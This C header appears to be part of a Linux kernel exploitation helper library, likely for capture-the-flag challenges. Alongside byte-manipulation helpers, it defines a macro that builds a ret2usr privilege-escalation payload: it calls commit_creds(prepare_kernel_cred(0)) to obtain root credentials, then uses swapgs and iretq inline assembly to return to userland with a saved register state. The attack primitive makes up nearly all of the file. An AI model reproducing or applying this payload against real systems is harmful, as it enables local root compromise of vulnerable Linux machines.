#pragma once
#include "bytes.h"

typedef struct {
  uint64_t cs;
  uint64_t ss;
  uint64_t sp;
  uint64_t flags;
} SavedState;

SavedState save_state(void);

Bytes *flat(const Bytes *, ...);
Bytes *b_mul(const Bytes *, size_t n);
Bytes * xor (const Bytes *, ...);
uint64_t posmod(int64_t i, int64_t n);

#define ESCALATE_PRIVS_AND_RET(func, state, pkc, cc, ret)                      \
  void func(void) {                                                            \
    void *(*prepare_kernel_cred)(void *) = (void *(*)(void *))pkc;             \
    void (*commit_creds)(void *) = (void (*)(void *))cc;                       \
                                                                               \
    commit_creds(prepare_kernel_cred(0));                                      \
                                                                               \
    __asm__ __volatile__(".intel_syntax noprefix;"                             \
                         "swapgs;"                                             \
                         "mov r15, %0;"                                        \
                         "push r15;"                                           \
                         "mov r15, %1;"                                        \
                         "push r15;"                                           \
                         "mov r15, %2;"                                        \
                         "push r15;"                                           \
                         "mov r15, %3;"                                        \
                         "push r15;"                                           \
                         "mov r15, %4;"                                        \
                         "push r15;"                                           \
                         "iretq;"                                              \
                         ".att_syntax;"                                        \
                         :                                                     \
                         : "r"(state.ss), "r"(state.sp), "r"(state.flags),     \
                           "r"(state.cs), "r"(ret));                           \
  }
